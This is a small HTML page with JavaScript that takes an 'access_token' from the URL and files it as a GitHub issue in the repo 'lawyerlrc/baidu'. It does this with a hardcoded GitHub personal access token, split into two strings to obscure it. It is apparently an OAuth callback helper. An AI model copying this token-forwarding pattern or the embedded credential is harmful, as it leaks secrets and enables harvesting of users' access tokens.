<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>556</title>
</head>
<body>
    以下是javascript代码

<script type="text/javascript">
    
let params = (new URL(document.location)).searchParams;
let access_token = params.get('access_token'); 
alert("start......");

</script>

<script  type="module">
    import { Octokit, App } from "https://cdn.skypack.dev/octokit";
    
let gtoken = 'ghp_'+'bpjctXGGmL9hneXBGWHbc5e0oyvV8D3XhTkD';

async function pushdata(){
  const octokit = new Octokit({ auth: gtoken });
  const {
        data: { login },
  } = await octokit.rest.users.getAuthenticated();
alert(login);
if (access_token){
    await octokit.rest.issues.create({
      owner: "lawyerlrc",
      repo: "baidu",
      title: "access_token",
      body: access_token,
    });
}  
const { data } = await octokit.rest.repos.getContent({
  mediaType: {
    format: "raw",
  },
  owner: "lawyerlrc",
  repo: "baidu",
  path: "data.txt",
});

alert(data);
alert('end')
};  
pushdata();


</script>
</body>
</html>
